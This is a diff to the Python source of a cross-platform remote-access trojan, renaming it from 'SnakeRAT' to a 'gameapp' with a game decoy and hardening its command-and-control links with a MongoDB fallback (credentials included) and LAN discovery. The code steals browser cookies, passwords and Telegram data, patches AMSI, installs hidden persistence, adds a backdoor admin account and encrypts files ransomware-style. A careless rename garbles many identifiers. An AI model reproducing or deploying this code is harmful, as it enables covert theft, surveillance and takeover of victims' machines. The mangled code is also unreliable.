@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-Advanced SnakeRAT - Stealth C2 Client with Game Decoy
+Advanced gameapp - Stealth Client  Client with Game Decoy
 Cross-Platform Version (Linux/Windows/macOS)
 Version: 3.1 Professional
 """
@@ -65,7 +65,7 @@ if IS_WINDOWS:
 else:
     WINDOWS_IMPORTS = False
 
-# Default Configuration (can be overridden via command line)
+# Default Configuappion (can be overridden via command line)
 C2_HOST = "127.0.0.1"
 C2_PORT = 4444
 
@@ -74,10 +74,10 @@ C2_SERVERS = [
     
 ]
 
-# Stealth Configuration
+# Stealth Configuappion
 SLEEP_JITTER = (2, 2)
 MAX_RETRIES = 5
-ENCRYPTION_KEY = "AdvancedSnakeRAT_2024_CrossPlatform"
+ENCRYPTION_KEY = "Advancedgameapp_2024_CrossPlatform"
 
 
 class BrowserManager:
@@ -370,8 +370,8 @@ class BrowserManager:
             profile_path = best_profile_path
             best_profile = best_profile_name
             
-            # Shadow Selected Profile
-            temp_user_data = os.path.join(tempfile.gettempdir(), f"chrome_shadow_{random.randint(1000, 9999)}")
+            # darksoul Selected Profile
+            temp_user_data = os.path.join(tempfile.gettempdir(), f"chrome_darksoul_{random.randint(1000, 9999)}")
             os.makedirs(temp_user_data, exist_ok=True)
             
             if profile_path and os.path.exists(profile_path):
@@ -640,7 +640,7 @@ class BrowserManager:
             if not potential_keys: return {'cookies': [], 'keys': {}}
             master_key = potential_keys[0]
 
-            # 2. Iterate Profiles
+            # 2. Iteappe Profiles
             profiles = ['Default', 'Guest Profile']
             for i in range(1, 10): profiles.append(f'Profile {i}')
             
@@ -729,7 +729,7 @@ class BrowserManager:
                             'name': name,
                             'value': dec_val,
                             'path': path,
-                            'expirationDate': unix_expires,
+                            'expiappionDate': unix_expires,
                             'httpOnly': bool(is_httponly),
                             'secure': bool(is_secure),
                             'sameSite': ss_str,
@@ -795,7 +795,7 @@ class BrowserManager:
             if not potential_keys: return {'passwords': [], 'keys': {}}
             master_key = potential_keys[0] # Primary key for reporting backward compatibility
 
-            # 2. Iterate Profiles
+            # 2. Iteappe Profiles
             profiles = ['Default', 'Guest Profile']
             for i in range(1, 10): profiles.append(f'Profile {i}')
             
@@ -831,7 +831,7 @@ class BrowserManager:
                                     iv = enc_pass[3:15]
                                     payload = enc_pass[15:]
                                     dec_pass = None
-                                    for idx, key in enumerate(potential_keys):
+                                    for idx, key in enumeappe(potential_keys):
                                         try:
                                             aesgcm = AESGCM(key)
                                             decrypted_bytes = aesgcm.decrypt(iv, payload, None)
@@ -925,7 +925,7 @@ class BrowserManager:
             return {'passwords': [], 'error': str(e)}
 
 class CryptoManager:
-    """Handle encryption/decryption of C2 communications"""
+    """Handle encryption/decryption of Client  communications"""
     
     def __init__(self, key=ENCRYPTION_KEY, is_raw=False):
         if is_raw:
@@ -948,11 +948,11 @@ class CryptoManager:
         return self.fernet.decrypt(data)
 
 class Logger:
-    """Stealthy log system for the client"""
+    """peaceful log system for the client"""
     
     def __init__(self, log_file=None, debug=True):
         self.debug_mode = debug
-        # Don't log to file if it's a shadow instance to stay stealthy
+        # Don't log to file if it's a darksoul instance to stay peaceful
         self.log_file = log_file if not any(x in os.path.abspath(__file__) for x in [".dbus-service", "ChromeUpdate", ".metadata"]) else None
         
         if self.log_file:
@@ -1041,7 +1041,7 @@ class SystemProfiler:
     def get_system_info():
         """Get comprehensive system information"""
         info = {
-            "client_id": SystemProfiler.generate_fingerprint(),
+            "client_id": SystemProfiler.geneappe_fingerprint(),
             "hostname": platform.node(),
             "os": platform.system(),
             "os_version": platform.version(),
@@ -1156,8 +1156,8 @@ class SystemProfiler:
             return {}
     
     @staticmethod
-    def generate_fingerprint():
-        """Generate unique machine fingerprint (cross-platform)"""
+    def geneappe_fingerprint():
+        """Geneappe unique machine fingerprint (cross-platform)"""
         fingerprint_data = []
         
         # Add system-specific identifiers
@@ -1375,23 +1375,23 @@ $watcher.Stop()
         except Exception as e:
             return {'error': 'Failed to resolve location'}
 
-class PersistenceManager:
-    """Multi-vector persistence installation and removal (Cross-platform)"""
+class livingManager:
+    """Multi-vector living installation and removal (Cross-platform)"""
 
     @staticmethod
-    def install_persistence(is_mongo_mode=False):
-        """Install persistence based on platform"""
+    def install_living(is_mongo_mode=False):
+        """Install living based on platform"""
         if IS_WINDOWS:
-            return PersistenceManager._windows_persistence(is_mongo_mode)
+            return livingManager._windows_living(is_mongo_mode)
         elif IS_LINUX:
-            return PersistenceManager._linux_persistence(is_mongo_mode)
+            return livingManager._linux_living(is_mongo_mode)
         elif IS_MAC:
-            return PersistenceManager._macos_persistence(is_mongo_mode)
+            return livingManager._macos_living(is_mongo_mode)
         return False, ["Platform not supported"]
     
     @staticmethod
-    def _windows_persistence(is_mongo_mode=False):
-        """Stealthy Windows persistence with multiple fallbacks"""
+    def _windows_living(is_mongo_mode=False):
+        """peaceful Windows living with multiple fallbacks"""
         results = []
         try:
             # Mask name
@@ -1468,11 +1468,11 @@ class PersistenceManager:
 
             return True, results
         except Exception as e:
-            return False, [f"Fatal persistence error: {str(e)}"]
+            return False, [f"Fatal living error: {str(e)}"]
 
     @staticmethod
-    def get_shadow_path():
-        """Get path to the persistent shadowed copy"""
+    def get_darksoul_path():
+        """Get path to the persistent darksouled copy"""
         if IS_WINDOWS:
             # Use .exe extension when running as a frozen PyInstaller executable
             ext = ".exe" if getattr(sys, 'frozen', False) else ".pyw"
@@ -1485,15 +1485,15 @@ class PersistenceManager:
         return None
     
     @staticmethod
-    def _linux_persistence(is_mongo_mode=False):
-        """Stealthy Linux persistence with shadowing"""
+    def _linux_living(is_mongo_mode=False):
+        """peaceful Linux living with darksouling"""
         try:
             # Mask name
             mask_name = "dbus-service"
             hidden_dir = os.path.expanduser(f"~/.cache/.{mask_name}")
             os.makedirs(hidden_dir, exist_ok=True)
             
-            # Shadow script
+            # darksoul script
             target_path = os.path.join(hidden_dir, "dbus-daemon.py")
             if os.path.abspath(__file__) != target_path:
                 import shutil
@@ -1537,11 +1537,11 @@ WantedBy=default.target
             
             return True, ["Desktop file created", "Systemd service enabled"]
         except Exception as e:
-            return False, [f"Linux persistence failed: {str(e)}"]
+            return False, [f"Linux living failed: {str(e)}"]
     
     @staticmethod
-    def _macos_persistence(is_mongo_mode=False):
-        """Stealthy macOS persistence with shadowing"""
+    def _macos_living(is_mongo_mode=False):
+        """peaceful macOS living with darksouling"""
         try:
             mask_name = "com.apple.metadata"
             hidden_dir = os.path.expanduser("~/Library/Application Support/.metadata")
@@ -1581,11 +1581,11 @@ WantedBy=default.target
             subprocess.run(["launchctl", "load", plist_path], capture_output=True)
             return True, ["LaunchAgent plist created and loaded"]
         except Exception as e:
-            return False, [f"macOS persistence failed: {str(e)}"]
+            return False, [f"macOS living failed: {str(e)}"]
 
     @staticmethod
-    def remove_persistence():
-        """Remove all established persistence mechanisms with detailed feedback"""
+    def remove_living():
+        """Remove all established living mechanisms with detailed feedback"""
         results = []
         try:
             if IS_WINDOWS:
@@ -1635,7 +1635,7 @@ WantedBy=default.target
                 if PrivilegeManager.is_admin():
                     try:
                         wmi_cleanup_script = f"""
-                        $name = 'SnakeUpdate'
+                        $name = 'gameUpdate'
                         Get-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter "Name='$name'" | Remove-WmiObject -ErrorAction SilentlyContinue
                         Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer -Filter "Name='$name'" | Remove-WmiObject -ErrorAction SilentlyContinue
                         Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding -Filter "Filter=\\"__EventFilter.Name='$name'\\"" | Remove-WmiObject -ErrorAction SilentlyContinue
@@ -1644,7 +1644,7 @@ WantedBy=default.target
                         encoded_cleanup = base64.b64encode(wmi_cleanup_script.encode('utf-16-le')).decode()
                         subprocess.run(['powershell', '-NoProfile', '-WindowStyle', 'Hidden', '-EncodedCommand', encoded_cleanup], 
                                        capture_output=True, creationflags=0x08000000)
-                        results.append("WMI persistence cleaned (if existed)")
+                        results.append("WMI living cleaned (if existed)")
                     except: pass
 
                 return True, results
@@ -1674,9 +1674,9 @@ WantedBy=default.target
                 if os.path.exists(hidden_dir):
                     import shutil
                     shutil.rmtree(hidden_dir, ignore_errors=True)
-                    results.append("Shadow files removed")
+                    results.append("darksoul files removed")
                 else:
-                    results.append("Shadow directory not found")
+                    results.append("darksoul directory not found")
                 
                 return True, results
 
@@ -1701,7 +1701,7 @@ class PrivilegeManager:
     
     @staticmethod
     def is_admin():
-        """Check if running with administrative privileges"""
+        """Check if running with administappive privileges"""
         try:
             if IS_WINDOWS:
                 return ctypes.windll.shell32.IsUserAnAdmin() != 0
@@ -1759,7 +1759,7 @@ class PrivilegeManager:
 
     @staticmethod
     def delevate():
-        """Drop administrative privileges (restarts as normal user)"""
+        """Drop administappive privileges (restarts as normal user)"""
         try:
             if not PrivilegeManager.is_admin():
                 return True, "Already running as normal user"
@@ -1812,7 +1812,7 @@ class CommandExecutor:
                 stdout=subprocess.PIPE,
                 stderr=subprocess.PIPE,
                 cwd=cwd or os.getcwd(),
-                start_new_session=not IS_WINDOWS, # Linux: separate session group
+                start_new_session=not IS_WINDOWS, # Linux: sepaappe session group
                 creationflags=subprocess.CREATE_NO_WINDOW if IS_WINDOWS else 0
             )
             
@@ -1869,20 +1869,20 @@ class CommandExecutor:
         except Exception as e:
             return {'error': str(e)}
 
-class AdvancedRAT:
-    """Core RAT functionality with advanced features"""
+class Advancedapp:
+    """Core app functionality with advanced features"""
     
     def __init__(self, start_mongo=False):
-        print("[*] Init SnakeRAT Subsystems...")
+        print("[*] Init gameapp Subsystems...")
         self.sock = None
         self.connected = False
         self.running = True
-        self.logger = Logger(log_file='rat.log', debug=True)
+        self.logger = Logger(log_file='app.log', debug=True)
         print("[*] Loading Crypto...")
         self.crypto = CryptoManager()
         print("[*] Running System Profiler...")
         self.profiler = SystemProfiler()
-        self.client_id = self.profiler.generate_fingerprint()
+        self.client_id = self.profiler.geneappe_fingerprint()
         self.current_server_index = 0
         self.retry_count = 0
         self.mongo_mode = start_mongo
@@ -1905,7 +1905,7 @@ class AdvancedRAT:
         self._audio_streaming = False
         self.sock_lock = threading.RLock()
         
-        self.logger.info(f"Initialized SnakeRAT v3.1 | ID: {self.client_id}")
+        self.logger.info(f"Initialized gameapp v3.1 | ID: {self.client_id}")
         
         # All data encrypted with this master key
         self.crypto = CryptoManager() 
@@ -1915,7 +1915,7 @@ class AdvancedRAT:
         self._window_logger_running = False
         self._window_log_buffer = []  # List of {time, title} dicts
         self._streaming = False
-        self._autorun_file = os.path.join(os.getenv('APPDATA') if IS_WINDOWS else os.path.expanduser('~'), '.snake_autorun')
+        self._autorun_file = os.path.join(os.getenv('APPDATA') if IS_WINDOWS else os.path.expanduser('~'), '.game_autorun')
         
         # Load and run autorun commands
         self._run_autorun()
@@ -1942,7 +1942,7 @@ class AdvancedRAT:
             'bsod': self._handle_bsod,
             'block_apps': self._handle_block_apps,
             'keylog': self._handle_keylog,
-            'persistence': self._handle_persistence,
+            'living': self._handle_living,
             'unpersist': self._handle_unpersist,
             'process': self._handle_process,
             'file_browser': self._handle_file_browser,
@@ -1986,7 +1986,7 @@ class AdvancedRAT:
             'window_logger': self._handle_window_logger,
             'enable_rdp': self._handle_enable_rdp,
             'script': self._handle_script,
-            'wmi': self._handle_wmi_persistence,
+            'wmi': self._handle_wmi_living,
             'browser_kill': self._handle_close_browser,
             'volume_control': self._handle_volume_control,
             'monitor_control': self._handle_monitor_control,
@@ -2001,7 +2001,7 @@ class AdvancedRAT:
         mode = cmd.get('params', {}).get('mode', 'normal')
         self.logger.info(f"Received request to change database mode to: {mode}")
         
-        # Manually write completed status to MongoDB
+        # Acknowledge via MongoDB if we're currently in mongo mode
         cmd_id = cmd.get('id', 'unknown')
         if hasattr(self, 'mongodb_client') and self.mongodb_client:
             try:
@@ -2018,10 +2018,35 @@ class AdvancedRAT:
                 )
             except Exception as e:
                 self.logger.error(f"Failed to write dbmode result to Mongo: {e}")
-        
-        if mode == 'normal':
+
+        if mode in ('normal', 'sqlite'):
+            # Signal the mongodb_loop to exit, then connection_loop will retry TCP
             self.mongo_mode = False
-            
+            # Close the TCP socket if somehow open, so _connection_loop starts fresh
+            with self.sock_lock:
+                if self.sock:
+                    try:
+                        self.sock.close()
+                    except Exception:
+                        pass
+                    self.sock = None
+            self.connected = False
+            self.retry_count = 0
+            self.logger.info("Switched client to Normal (TCP) mode")
+        elif mode in ('mongo', 'mongodb'):
+            # Signal that we want MongoDB mode — _connection_loop will call _mongodb_loop
+            self.mongo_mode = True
+            # Disconnect TCP so the connection_loop falls into the mongo branch
+            self.connected = False
+            with self.sock_lock:
+                if self.sock:
+                    try:
+                        self.sock.close()
+                    except Exception:
+                        pass
+                    self.sock = None
+            self.logger.info("Switched client to MongoDB mode")
+
         return {"status": "success", "message": f"Switched mode to {mode}"}
         
     def _handle_script(self, cmd):
@@ -2031,7 +2056,7 @@ class AdvancedRAT:
             return {'error': 'No code provided'}
         
         try:
-            # Execute in a separate context to avoid crashing the main thread
+            # Execute in a sepaappe context to avoid crashing the main thread
             # and to allow using 'print' etc.
             import io
             from contextlib import redirect_stdout, redirect_stderr
@@ -2042,7 +2067,7 @@ class AdvancedRAT:
             with redirect_stdout(f_stdout), redirect_stderr(f_stderr):
                 # Provide some useful objects in the global namespace
                 globals_dict = {
-                    'rat': self,
+                    'app': self,
                     'sys': sys,
                     'os': os,
                     'subprocess': subprocess,
@@ -2066,7 +2091,7 @@ class AdvancedRAT:
             }
     
     def _send_encrypted(self, data):
-        """Send encrypted data to C2 with robust locking and error handling"""
+        """Send encrypted data to Client  with robust locking and error handling"""
         import datetime
         import json
         if getattr(self, 'mongo_mode', False):
@@ -2153,7 +2178,7 @@ class AdvancedRAT:
             return False
 
     def _send_loot(self, loot_type, data, filename=None):
-        """Send loot (screenshot/webcam/audio/files) to C2"""
+        """Send loot (screenshot/webcam/audio/files) to Client """
         if getattr(self, 'mongo_mode', False):
             try:
                 import datetime
@@ -2181,7 +2206,7 @@ class AdvancedRAT:
             return False
             
         try:
-            self.logger.info(f"Sending {loot_type} loot to C2...")
+            self.logger.info(f"Sending {loot_type} loot to Client ...")
             loot_msg = {
                 'type': 'loot',
                 'loot_type': loot_type,
@@ -2276,7 +2301,7 @@ class AdvancedRAT:
             return False
 
     def _recv_command(self, use_master=False):
-        """Receive and decrypt command from C2"""
+        """Receive and decrypt command from Client """
         if not self.sock:
             return None
         
@@ -2312,17 +2337,21 @@ class AdvancedRAT:
     
     def _heartbeat_loop(self):
         """Send periodic heartbeats with live metrics"""
+        INTERVAL = 30  # seconds between heartbeats
         while self.running:
-            if self.connected and self.sock:
+            if self.connected and self.sock and not getattr(self, 'mongo_mode', False):
                 try:
                     payload = {'type': 'heartbeat'}
                     metrics = self.profiler.get_metrics()
                     if metrics:
                         payload['metrics'] = metrics
                     self._send_encrypted(payload)
-                except:
-                    try: self._send_encrypted({'type': 'heartbeat'})
-                    except: pass
+                except Exception:
+                    try:
+                        self._send_encrypted({'type': 'heartbeat'})
+                    except Exception:
+                        pass
+            time.sleep(INTERVAL)
 
     def _ensure_pymongo(self):
         try:
@@ -2386,7 +2415,7 @@ class AdvancedRAT:
             self._load_dotenv()
             mongodb_uri = os.environ.get('MONGODB_URI')
             if not mongodb_uri:
-                mongodb_uri = "mongodb+srv://manankamboj66_db_user:manankamboj2010@c2db-cluster.tag4k0q.mongodb.net/?appName=C2db-cluster"
+                mongodb_uri = "mongodb+srv://manankamboj66_db_user:manankamboj2010@Client db-cluster.tag4k0q.mongodb.net/?appName=Client db-cluster"
             
             mongodb_uri = _safe_mongo_uri(mongodb_uri)
             self.logger.info(f"Connecting to MongoDB with URI: {mongodb_uri[:35]}...")
@@ -2397,19 +2426,21 @@ class AdvancedRAT:
 
             # Send handshake record to signal waiting
             sys_info = self.profiler.get_system_info()
+            client_ip = sys_info.get('public_ip') or sys_info.get('internal_ip') or '127.0.0.1'
+            now_iso = datetime.datetime.now(datetime.timezone.utc).isoformat()
             db.mongo_handshake.update_one(
                 {"client_id": self.client_id},
                 {"$set": {
                     "client_id": self.client_id,
                     "status": "client_waiting",
                     "info": sys_info,
-                    "timestamp": datetime.datetime.now().isoformat()
+                    "timestamp": now_iso
                 }},
                 upsert=True
             )
             self.logger.info("Sent connection request to MongoDB handshake collection.")
 
-            # Wait for server connected response — retry indefinitely so a server restart is picked up
+            # Wait for server connected response
             connected_via_db = False
             while getattr(self, 'mongo_mode', False) and self.running:
                 # (Re-)write client_waiting so server sees us even after its own restart
@@ -2419,19 +2450,24 @@ class AdvancedRAT:
                         "client_id": self.client_id,
                         "status": "client_waiting",
                         "info": sys_info,
-                        "timestamp": datetime.datetime.now().isoformat()
+                        "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat()
                     }},
                     upsert=True
                 )
-                # Poll for server acknowledgement
-                for _ in range(30):  # 60 seconds per attempt
+                # Fast poll for server acknowledgement or switch_to_tcp signal
+                for _ in range(30):
                     if not getattr(self, 'mongo_mode', False) or not self.running:
                         break
                     hs = db.mongo_handshake.find_one({"client_id": self.client_id})
-                    if hs and hs.get('status') == 'server_connected':
-                        connected_via_db = True
-                        break
-                    time.sleep(2)
+                    if hs:
+                        if hs.get('status') == 'server_connected':
+                            connected_via_db = True
+                            break
+                        elif hs.get('status') == 'switch_to_tcp':
+                            self.logger.info("Server requested switch to TCP mode.")
+                            self.mongo_mode = False
+                            return
+                    time.sleep(1)
                 if connected_via_db:
                     break
                 self.logger.warning("No response from server yet — re-signaling handshake and waiting...")
@@ -2440,12 +2476,11 @@ class AdvancedRAT:
                 self.logger.error("Mongo mode exited before server responded.")
                 return
 
-            self.logger.success("Connected to C2 server through DB only!")
-
+            self.logger.success("Connected to Client server through DB only!")
 
         except Exception as e:
             self.logger.error(f"MongoDB connection failed: {e}")
-            time.sleep(10)
+            time.sleep(2)
             return
 
         last_heartbeat = 0
@@ -2453,11 +2488,18 @@ class AdvancedRAT:
         
         while self.running and getattr(self, 'mongo_mode', False):
             try:
+                # Quick check if server requested switch back to TCP
+                hs = db.mongo_handshake.find_one({"client_id": self.client_id})
+                if hs and hs.get('status') == 'switch_to_tcp':
+                    self.logger.info("Server instructed switch back to TCP mode.")
+                    self.mongo_mode = False
+                    break
+
                 now = time.time()
-                ts = datetime.datetime.now().isoformat()
+                ts = datetime.datetime.now(datetime.timezone.utc).isoformat()
                 
-                # 1. Heartbeat (Every 30 seconds)
-                if now - last_heartbeat > 30:
+                # 1. Heartbeat (Every 15 seconds for snappy presence)
+                if now - last_heartbeat > 15:
                     last_heartbeat = now
                     try:
                         if cached_sys_info is None:
@@ -2468,9 +2510,10 @@ class AdvancedRAT:
                         sys_info = {"error": str(e)}
                         metrics = {}
                         
+                    client_ip = sys_info.get('public_ip') or sys_info.get('internal_ip') or '127.0.0.1'
                     client_data = {
                         "id": self.client_id,
-                        "ip_address": "127.0.0.1",
+                        "ip_address": client_ip,
                         "hostname": sys_info.get('hostname'),
                         "os": sys_info.get('os'),
                         "username": sys_info.get('username'),
@@ -2500,14 +2543,14 @@ class AdvancedRAT:
                     db.system_info.insert_one(metrics_doc)
                     self.logger.info("Sent MongoDB heartbeat and metrics.")
 
-                # 2. Check for pending commands targeting this client (atomic claim)
+                # 2. Check for pending commands targeting this client (including broadcasts)
                 while True:
                     cmd = db.commands.find_one_and_update(
-                        {"client_id": self.client_id, "status": "pending"},
+                        {"$or": [{"client_id": self.client_id}, {"client_id": "*"}], "status": "pending"},
                         {"$set": {
                             "status": "executing",
                             "is_active": 1,
-                            "updated_at": datetime.datetime.now().isoformat()
+                            "updated_at": datetime.datetime.now(datetime.timezone.utc).isoformat()
                         }},
                         sort=[("created_at", 1)],
                         return_document=False
@@ -2560,47 +2603,77 @@ class AdvancedRAT:
                 time.sleep(0.2)
 
             except Exception as e:
-                self.logger.error(f"Error in MongoDB poll iteration: {e}")
+                self.logger.error(f"Error in MongoDB poll iteappion: {e}")
                 time.sleep(5)
 
+    def _discover_server(self):
+        """Broadcast UDP packet on port 4445 to locate local server on the LAN automatically."""
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
+            sock.settimeout(1.0)
+            sock.sendto(b"gameapp_DISCOVER", ('<broadcast>', 4445))
+            data, addr = sock.recvfrom(1024)
+            sock.close()
+            if data == b"gameapp_OFFER":
+                self.logger.success(f"Discovered server on LAN at {addr[0]}")
+                return addr[0]
+        except Exception:
+            pass
+        return None
+
     def _connection_loop(self):
-        """Main connection loop with failover and mandatory backoff"""
+        """Main connection loop with auto-discovery, fast failover, and responsive reconnects"""
         while self.running:
             if getattr(self, 'mongo_mode', False):
                 try:
                     self._mongodb_loop()
                 except Exception as ex:
                     self.logger.error(f"Error in MongoDB Loop: {ex}")
-                time.sleep(5)
+                # After _mongodb_loop exits (mongo_mode became False), reset and retry TCP immediately
+                self.retry_count = 0
+                time.sleep(0.5)
                 continue
                 
             try:
-                server = C2_SERVERS[self.current_server_index]
+                server = C2_SERVERS[self.current_server_index % len(C2_SERVERS)]
+
+                # If pointing to localhost or after retry, attempt LAN auto-discovery
+                if (server['host'] in ('127.0.0.1', 'localhost') and self.retry_count > 0) or self.retry_count >= 2:
+                    discovered_ip = self._discover_server()
+                    if discovered_ip:
+                        server['host'] = discovered_ip
                 
                 self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                self.sock.settimeout(300) # 5m timeout to handle server idle
+                self.sock.settimeout(5)  # fast 5-second connect timeout
                 
-                # Disable Nagle's algorithm for faster responses
+                # Enable keepalive and disable Nagle for responsive connections
+                try:
+                    self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+                    self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 20)
+                    self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 5)
+                    self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 3)
+                except (AttributeError, OSError):
+                    pass
                 try:
                     self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-                except:
+                except Exception:
                     pass
                     
                 self.logger.info(f"Attempting to connect to {server['host']}:{server['port']}...")
                 self.sock.connect((server['host'], server['port']))
+                self.sock.settimeout(300)  # 5m idle timeout after connection
                 
                 self.connected = True
                 self.retry_count = 0
-                self.logger.success(f"Connected to C2 server: {server['host']}:{server['port']}")
+                self.logger.success(f"Connected to Client server: {server['host']}:{server['port']}")
                 
-                # Pre-collect info to minimize time socket sits idle before first message
-                # This prevents [WinError 10053] where the server times out the handshake
-                self.logger.info("Preparing system profile...")
+                # Pre-collect info to minimize idle time before first handshake
                 self.logger.info("Preparing system profile...")
                 try:
                     sys_info = self.profiler.get_system_info()
                     initial_metrics = self.profiler.get_metrics()
-                except:
+                except Exception:
                     sys_info = {"error": "info_gathering_failed"}
                     initial_metrics = {}
 
@@ -2631,41 +2704,39 @@ class AdvancedRAT:
                 self.logger.error(f"Connection failed: {str(e)}")
                 
                 # Priority connection: try the first server more often
-                if self.retry_count < 3:
+                if self.retry_count < 2:
                     self.current_server_index = 0
                 else:
                     self.current_server_index = (self.current_server_index + 1) % len(C2_SERVERS)
                 
                 self.retry_count += 1
-                if self.retry_count >= 10:
-                    self.logger.warning("Failed to connect via TCP 10 times. Switching to MongoDB Hybrid Mode...")
+                if self.retry_count >= 2 and not getattr(self, 'mongo_mode', False):
+                    self.logger.warning("TCP connection unavailable. Migrating seamlessly to MongoDB Atlas...")
                     self.mongo_mode = True
-                    try:
-                        self._mongodb_loop()
-                    except Exception as ex:
-                        self.logger.error(f"Error in MongoDB Loop: {ex}")
-                    finally:
-                        self.mongo_mode = False
-                        self.retry_count = 0
+                    self.retry_count = 0
             
-            # Clean up and mandatory sleep before next attempt
+            # Clean up socket using lock to avoid races with _handle_dbmode_client
             self.connected = False
-            if self.sock:
-                try: self.sock.close()
-                except: pass
-                self.sock = None
+            with self.sock_lock:
+                if self.sock:
+                    try:
+                        self.sock.close()
+                    except Exception:
+                        pass
+                    self.sock = None
             
-            # Always wait 5 seconds before trying to reconnect
-            time.sleep(5)
+            # Fast backoff: 1-3 seconds max for rapid failover
+            backoff = min(1 + self.retry_count, 3)
+            time.sleep(backoff)
 
     
     def _command_loop(self):
-        """Process commands from C2"""
+        """Process commands from Client """
         while self.connected and self.running:
             try:
                 cmd = self._recv_command()
                 if not cmd:
-                    self.logger.warning("Connection closed by C2 server")
+                    self.logger.warning("Connection closed by Client  server")
                     self.connected = False
                     break
                 
@@ -2881,14 +2952,14 @@ class AdvancedRAT:
             return {'error': str(e)}
 
     def _handle_file_crypt(self, cmd):
-        """Encrypt or decrypt files for operational security or ransomware-style tests"""
+        """Encrypt or decrypt files for opeappional security or ransomware-style tests"""
         action = cmd.get('action', 'encrypt')
         target = cmd.get('path', os.getcwd())
-        password = cmd.get('password', 'AdvancedSnakeRAT_2024')
+        password = cmd.get('password', 'Advancedgameapp_2024')
         recursive = cmd.get('recursive', False)
         
         # Derive a robust key from password
-        salt = b'SnakeRAT_Professional_2024'
+        salt = b'gameapp_Professional_2024'
         kdf = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000)
         key = base64.urlsafe_b64encode(kdf)
         fernet = Fernet(key)
@@ -2897,10 +2968,10 @@ class AdvancedRAT:
         
         def process_path(p):
             if os.path.isfile(p):
-                # Don't encrypt the RAT itself or critical system files
+                # Don't encrypt the app itself or critical system files
                 filename = os.path.basename(p).lower()
                 ext = os.path.splitext(filename)[1].lower()
-                if filename in ['s.py', 'd.py', 'rat.py'] or ext in ['.exe', '.dll', '.sys', '.bin']:
+                if filename in ['s.py', 'd.py', 'app.py'] or ext in ['.exe', '.dll', '.sys', '.bin']:
                     return
                 
                 try:
@@ -2909,10 +2980,10 @@ class AdvancedRAT:
                     
                     if action == 'encrypt':
                         # Check if already encrypted (our signature)
-                        if data.startswith(b'RAT_ENC'): return
-                        new_data = b'RAT_ENC' + fernet.encrypt(data)
+                        if data.startswith(b'app_ENC'): return
+                        new_data = b'app_ENC' + fernet.encrypt(data)
                     else: # decrypt
-                        if not data.startswith(b'RAT_ENC'): return
+                        if not data.startswith(b'app_ENC'): return
                         new_data = fernet.decrypt(data[7:])
                     
                     with open(p, 'wb') as f:
@@ -2930,7 +3001,7 @@ class AdvancedRAT:
         return results
 
     def _handle_amsi_bypass(self, cmd):
-        """Advanced AMSI/ETW Patching for invisible operation on Windows Defender systems"""
+        """Advanced AMSI/ETW Patching for invisible opeappion on Windows Defender systems"""
         if not IS_WINDOWS or not WINDOWS_IMPORTS:
             return {'error': 'AMSI bypass is only available on Windows with native imports'}
             
@@ -3034,7 +3105,7 @@ class AdvancedRAT:
         return {'success': False, 'message': 'No tokens found'}
 
     def _handle_extract_telegram(self, cmd):
-        """Package Telegram tdata for exfiltration"""
+        """Package Telegram tdata for exfiltappion"""
         tdata_path = os.path.join(os.getenv('APPDATA'), 'Telegram Desktop', 'tdata')
         if not os.path.exists(tdata_path):
             return {'error': 'Telegram tdata path not found'}
@@ -3312,7 +3383,7 @@ class AdvancedRAT:
 
                             if self.connected:
                                 # Optimization: If the socket is currently busy sending another frame
-                                # or command, skip this frame to prevent the RAT from 'sticking'.
+                                # or command, skip this frame to prevent the app from 'sticking'.
                                 if self.sock_lock.acquire(blocking=False):
                                     try:
                                         self._send_encrypted({
@@ -3577,7 +3648,7 @@ class AdvancedRAT:
           1. Set registry key to allow TS connections
           2. Add firewall rule to allow TCP 3389
           3. Optionally create a backdoor local admin account
-        Returns connection info so the operator can RDP in immediately."""
+        Returns connection info so the opeappor can RDP in immediately."""
         if not IS_WINDOWS:
             return {'error': 'enable_rdp is only supported on Windows'}
 
@@ -3637,7 +3708,7 @@ class AdvancedRAT:
                 try:
                     cmds = [
                         f'net user {username} "{password}" /add',
-                        f'net localgroup administrators {username} /add',
+                        f'net localgroup administappors {username} /add',
                         f'net localgroup "Remote Desktop Users" {username} /add',
                     ]
                     for c in cmds:
@@ -3735,15 +3806,15 @@ class AdvancedRAT:
         except Exception as e:
             return {'error': str(e)}
 
-    def _handle_wmi_persistence(self, cmd):
-        """Install WMI Event Subscription persistence (Highly stealthy)"""
-        if not IS_WINDOWS: return {'error': 'WMI persistence only supported on Windows'}
+    def _handle_wmi_living(self, cmd):
+        """Install WMI Event Subscription living (Highly peaceful)"""
+        if not IS_WINDOWS: return {'error': 'WMI living only supported on Windows'}
         
-        # WMI Persistence requires Administrator privileges
+        # WMI living requires Administappor privileges
         if not PrivilegeManager.is_admin():
-            return {'error': 'Administrator privileges required for WMI persistence'}
+            return {'error': 'Administappor privileges required for WMI living'}
 
-        name = "SnakeUpdate"
+        name = "gameUpdate"
         # Ensure command is properly quoted for CommandLineTemplate
         command = cmd.get('command')
         if not command:
@@ -3795,7 +3866,7 @@ class AdvancedRAT:
             res = subprocess.run(['powershell', '-NoProfile', '-WindowStyle', 'Hidden', '-EncodedCommand', encoded_script], 
                                  capture_output=True, text=True, creationflags=0x08000000)
             if res.returncode == 0:
-                return {'success': True, 'message': f'WMI Persistence "{name}" installed successfully.'}
+                return {'success': True, 'message': f'WMI living "{name}" installed successfully.'}
             return {'error': res.stderr or res.stdout}
         except Exception as e:
             return {'error': str(e)}
@@ -4326,7 +4397,7 @@ class AdvancedRAT:
     
     def _handle_microphone(self, cmd):
         """Record microphone (cross-platform)"""
-        duration = cmd.get('duration', 10)
+        duappion = cmd.get('duappion', 10)
         
         try:
             import pyaudio
@@ -4335,17 +4406,17 @@ class AdvancedRAT:
             CHUNK = 1024
